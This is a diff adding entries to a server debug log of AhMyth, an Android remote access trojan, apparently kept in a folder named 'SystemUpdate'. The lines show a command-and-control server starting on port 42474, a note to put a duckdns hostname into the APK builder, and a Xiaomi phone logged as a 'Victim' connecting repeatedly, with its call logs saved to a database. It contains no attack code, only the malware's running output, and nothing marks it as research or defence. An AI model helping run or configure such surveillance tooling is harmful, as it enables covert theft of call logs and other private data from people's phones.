@@ -395,3 +395,25 @@
 [2026-02-08T05:24:48.073Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
 [2026-02-08T05:24:48.082Z] 💾 Victim saved to database: e702c6c3ca97f8de
 [2026-02-08T05:24:57.495Z] 📞 Saving 5 call logs to database for e702c6c3ca97f8de
+[2026-02-08T05:29:43.278Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T05:29:43.287Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T05:30:00.537Z] Server is now listening on port: 42474
+[2026-02-08T05:30:00.538Z] IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring
+[2026-02-08T05:31:33.900Z] Server Starting...
+[2026-02-08T05:31:33.901Z] Log file path: D:\Dev\Projects\Android\Android-RAT-master\SystemUpdate\AhMyth-Server\app\server_debug.log
+[2026-02-08T05:31:33.907Z] ✅ Database and Export Manager initialized
+[2026-02-08T05:31:38.081Z] Server is now listening on port: 42474
+[2026-02-08T05:31:38.081Z] IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring
+[2026-02-08T05:34:35.628Z] New Socket.IO connection! ID: /#3rvSxc-ViMvp5RUoAAAA IP: ::ffff:217.138.220.122
+[2026-02-08T05:34:35.629Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T05:34:35.637Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T05:35:20.657Z] 📞 Saving 5 call logs to database for e702c6c3ca97f8de
+[2026-02-08T05:38:48.054Z] Server Starting...
+[2026-02-08T05:38:48.055Z] Log file path: D:\Dev\Projects\Android\Android-RAT-master\SystemUpdate\AhMyth-Server\app\server_debug.log
+[2026-02-08T05:38:48.060Z] ✅ Database and Export Manager initialized
+[2026-02-08T05:38:52.747Z] Server is now listening on port: 42474
+[2026-02-08T05:38:52.747Z] IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring
+[2026-02-08T05:38:59.761Z] New Socket.IO connection! ID: /#I2jL0vhydMwvLD2GAAAA IP: ::ffff:217.138.220.122
+[2026-02-08T05:38:59.761Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T05:38:59.772Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T05:39:15.270Z] 📞 Saving 5 call logs to database for e702c6c3ca97f8de
